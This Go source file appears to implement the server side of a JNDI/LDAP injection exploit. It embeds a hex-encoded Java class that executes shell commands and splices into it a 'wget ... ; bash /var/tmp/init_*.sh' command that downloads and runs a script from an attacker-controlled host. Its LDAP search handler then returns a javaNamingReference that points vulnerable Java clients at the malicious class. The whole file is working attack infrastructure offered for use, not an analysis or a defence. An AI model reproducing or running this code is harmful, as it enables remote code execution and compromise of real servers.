package jndi

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/For-ACGN/ldapserver"
	"github.com/lor00x/goldap/message"
	"github.com/sbot/utils/fileutils"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	JavaAttackPayloadBefore = `CAFEBABE0000003400400A001200220700230A000200220700240700250A000400260800270A000500280A000400290A0004002A0A002B002C07002D0A000C002E0A0002002F0800300A001100310700320700330100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C6501000E65786563757465436F6D6D616E64010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B01000D537461636B4D61705461626C6507002507002307002D0100046D61696E010016285B4C6A6176612F6C616E672F537472696E673B295601000A457863657074696F6E7301000A536F7572636546696C6501000C4A61724D61696E2E6A6176610C001300140100176A6176612F6C616E672F537472696E674275696C6465720100186A6176612F6C616E672F50726F636573734275696C6465720100106A6176612F6C616E672F537472696E670C0013001E0100012C0C003400350C003600370C0038003907003A0C003B003C0100136A6176612F6C616E672F457863657074696F6E0C003D003E0C003F003E01`
	JavaAttackPayloadAfter  = `0C001700180100074A61724D61696E0100106A6176612F6C616E672F4F626A65637401000573706C6974010027284C6A6176612F6C616E672F537472696E673B295B4C6A6176612F6C616E672F537472696E673B010007636F6D6D616E6401002F285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573734275696C6465723B010005737461727401001528294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000777616974466F7201000328294901000A6765744D65737361676501001428294C6A6176612F6C616E672F537472696E673B010008746F537472696E67002100110012000000000003000100130014000100150000002100010001000000052AB70001B10000000100160000000A00020000000300040004000A0017001800010015000000900003000400000037BB000259B700034CBB00045903BD0005B700064D2C2A1207B60008B60009572CB6000A4E2DB6000B57A700094D2CB6000DB02BB6000EB0000100080029002C000C00020016000000260009000000080008000C0014000E001F00100024001200290016002C0014002D0015003200180019000000130002FF002C000207001A07001B000107001C050009001D001E00020015000000230001000100000007120FB8001057B10000000100160000000A00020000001D0006001F001F000000040001000C00010020000000020021`
	// TokenExpireTime is used to prevent repeat execute payload.
	TokenExpireTime = 20
	JavaPayloadName = "JarMain"
	JavaPayloadClassName = "JarMain.class"
	)



type LdapServerHandler struct {

	payloadDir string
	codeBase   string

	// tokens set is used to prevent repeat
	// execute payload when use obfuscate.
	// key is token, value is timestamp
	tokens   map[string]int64
	tokensMu sync.Mutex
}

func getHexCmdLen(cmd string ) string {

	n := len(cmd)

	if n == 0 {
		return "0000"
	}

	hexStr := fmt.Sprintf("%X",n)

	switch len(hexStr) {

	case 4:
		return hexStr

	case 3:
		return "0"+hexStr

	case 2:
		return "00"+hexStr

	case 1:
		return "000"+hexStr

	default:
		return "0000"
	}

}

func makeCmdFromAttackInfo(attackInfo string) (string,error) {

	d, err := base64.StdEncoding.DecodeString(attackInfo)

	if err != nil {
		return "", err
	}

	s := string(d)

	if s == "" || strings.Index(s, ",") <= 0 {

		return "", fmt.Errorf("Invalid attack info format:%s", s)

	}

	args := strings.Split(s, ",")

	if len(args) != 10 {
		return "", fmt.Errorf("Invalid attack info  format:%s", s)
	}

	urlfmt := base64.StdEncoding.EncodeToString([]byte(strings.Join(args[2:],",")))

	initUrl := fmt.Sprintf("http://%s:%s/%s",args[0],args[1],urlfmt)

	attackType := args[5]
	nodeId := args[3]

	return fmt.Sprintf("wget %s -q -O /var/tmp/init_%s.sh;bash /var/tmp/init_%s.sh %s %s",
		initUrl,
		attackType,
		attackType,
		nodeId,
		attackType),nil
}

func (h *LdapServerHandler) makePayload(attackInfo string) (string,error) {

	initCmd,err := makeCmdFromAttackInfo(attackInfo)

	if err!=nil {

		return "",err
	}

	cmd := fmt.Sprintf("bash,-c,%s",initCmd)

	cmdHex := strings.ToLower(hex.EncodeToString([]byte(cmd)))
	cmdLenHex := getHexCmdLen(cmd)

	javaPayloadHexString := fmt.Sprintf("%s%s%s%s",JavaAttackPayloadBefore,cmdLenHex,cmdHex,JavaAttackPayloadAfter)

	javaFilePath := filepath.Join(h.payloadDir,JavaPayloadClassName)

	jdata,err := hex.DecodeString(javaPayloadHexString)
	if err!=nil {
		return "",err
	}

	if err=fileutils.WriteFile(javaFilePath,jdata) ;err!=nil {

		return "",err
	}

	return javaFilePath,nil
}

func (h *LdapServerHandler) handleBind(w ldapserver.ResponseWriter, _ *ldapserver.Message) {
	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func (h *LdapServerHandler) handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Message) {

	addr := m.Client.Addr()
	req := m.GetSearchRequest()
	dn := string(req.BaseObject())

	// check class name has token
	if strings.Contains(dn, "$") {
		// parse token
		sections := strings.SplitN(dn, "$", 2)
		class := sections[0]
		if class == "" {
			log.Printf("[warning] %s search invalid java class \"%s\"", addr, dn)
			h.sendErrorResult(w)
			return
		}
		// check token is already exists
		token := sections[1]
		if token == "" {
			log.Printf("[warning] %s search java class with invalid token \"%s\"", addr, dn)
			h.sendErrorResult(w)
			return
		}

		if !h.checkToken(token) {
			h.sendErrorResult(w)
			return
		}

		dn = class
	}

	log.Printf("[exploit] %s make  java class payload from attack information: \"%s\"", addr, dn)

	payloadPath,err := h.makePayload(dn)
	if err!=nil {
		log.Printf("[error] %s failed to make java attack payload class \"%s\": %s", addr, dn, err)
		h.sendErrorResult(w)
		return
	}

	// check class file is exists
	fi, err := os.Stat(payloadPath)
	if err != nil {
		log.Printf("[error] %s failed to search java class \"%s\": %s", addr, dn, err)
		h.sendErrorResult(w)
		return
	}
	if fi.IsDir() {
		log.Printf("[error] %s searched java class \"%s\" is a directory", addr, dn)
		h.sendErrorResult(w)
		return
	}

	// send search result
	res := ldapserver.NewSearchResultEntry(dn)
	res.AddAttribute("objectClass", "javaNamingReference")
	res.AddAttribute("javaClassName", message.AttributeValue(JavaPayloadName))
	res.AddAttribute("javaFactory", message.AttributeValue(JavaPayloadName))
	res.AddAttribute("javaCodebase", message.AttributeValue(h.codeBase))
	w.Write(res)

	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(done)
}

func (h *LdapServerHandler) checkToken(token string) bool {
	h.tokensMu.Lock()
	defer h.tokensMu.Unlock()
	// clean token first
	now := time.Now().Unix()
	for key, timestamp := range h.tokens {
		delta := now - timestamp
		if delta > TokenExpireTime || delta < -TokenExpireTime {
			delete(h.tokens, key)
		}
	}
	// check token is already exists
	if _, ok := h.tokens[token]; ok {
		return false
	}
	h.tokens[token] = time.Now().Unix()
	return true
}

func (h *LdapServerHandler) sendErrorResult(w ldapserver.ResponseWriter) {
	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultNoSuchObject)
	w.Write(done)
}